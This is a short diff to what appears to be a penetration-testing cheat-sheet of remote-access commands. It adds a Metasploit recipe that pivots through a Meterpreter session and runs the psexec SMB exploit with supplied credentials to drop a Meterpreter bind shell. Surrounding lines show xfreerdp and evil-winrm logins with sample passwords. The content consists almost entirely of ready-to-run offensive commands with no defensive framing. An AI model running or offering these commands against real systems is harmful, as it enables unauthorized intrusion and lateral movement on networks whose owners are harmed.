@@ -6,6 +6,18 @@ $ xfreerdp +clipboard /v:IP /u:foo /p:bar
 ============= REMOTE SESSION ==============
 ===========================================
 
+Metasploit:
+# If Meterpreter session17: route add 192.168.0.0/24 17
+use exploit/windows/smb/psexec
+set SMBUser userman
+set SMBPass "userman1!"
+set RHOSTS 192.168.0.1
+set payload windows/x64/meterpreter/bind_tcp
+set LPORT 8000
+run
+
+
+
 ============= WINRM =============
 evil-winrm -i 10.0.0.1 -u superadmin -p "Password\@2024"
 
